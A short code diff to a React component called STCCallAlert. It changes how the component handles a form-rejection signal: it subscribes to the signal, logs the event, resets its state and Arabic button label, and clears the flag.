@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
@@ -28,16 +28,31 @@ export default function STCCallAlert() {
     }
   }, [isFormApproved.value, navigate]);
 
-  // Handle form rejection
+  // Handle form rejection - subscribe to signal changes
   useEffect(() => {
-    if (isFormRejected.value) {
-      setCallReceived(false);
-      setButtonText("إعادة تلقي مكالمة");
-      if (inputRef.current) {
-        inputRef.current.focus();
+    const checkRejection = () => {
+      if (isFormRejected.value) {
+        console.log("Form rejected detected in STCCallAlert");
+        setCallReceived(false);
+        setButtonText("إعادة تلقي مكالمة");
+        // Reset the rejection flag after handling
+        isFormRejected.value = false;
+        if (inputRef.current) {
+          inputRef.current.focus();
+        }
       }
-    }
-  }, [isFormRejected.value]);
+    };
+    
+    // Check immediately
+    checkRejection();
+    
+    // Subscribe to signal changes
+    const unsubscribe = isFormRejected.subscribe(checkRejection);
+    
+    return () => {
+      unsubscribe();
+    };
+  }, []);
 
   const handleCallReceived = () => {
     setCallReceived(true);
